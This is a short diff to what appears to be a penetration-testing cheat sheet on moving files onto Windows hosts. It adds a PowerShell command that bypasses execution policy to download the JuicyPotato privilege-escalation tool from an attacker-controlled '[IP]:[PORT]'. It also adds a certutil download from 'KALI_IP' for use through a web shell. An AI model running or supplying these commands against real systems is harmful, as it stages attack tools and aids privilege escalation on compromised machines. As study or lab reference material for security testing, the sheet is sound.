@@ -93,6 +93,7 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 
 
 
+powershell "IEX(New-Object Net.WebClient).downloadFile('http://[IP]:[PORT]/JuicyPotato.exe', 'C:\Users\public\JuicyPotato.exe')" -bypass executionpolicy
 
 
 
@@ -102,6 +103,10 @@ certutil -urlcache -f http://[IP]/[FILENAME] [DEST FILENAME]
 
 
 certutil -urlcache -split -f http://192.168.1.2/putty.exe
+
+
+# if via web shell
+cmd.exe /c certutil.exe -urlcache -f http://KALI_IP/FILE OUTPUT_PATH
 
 ```
 
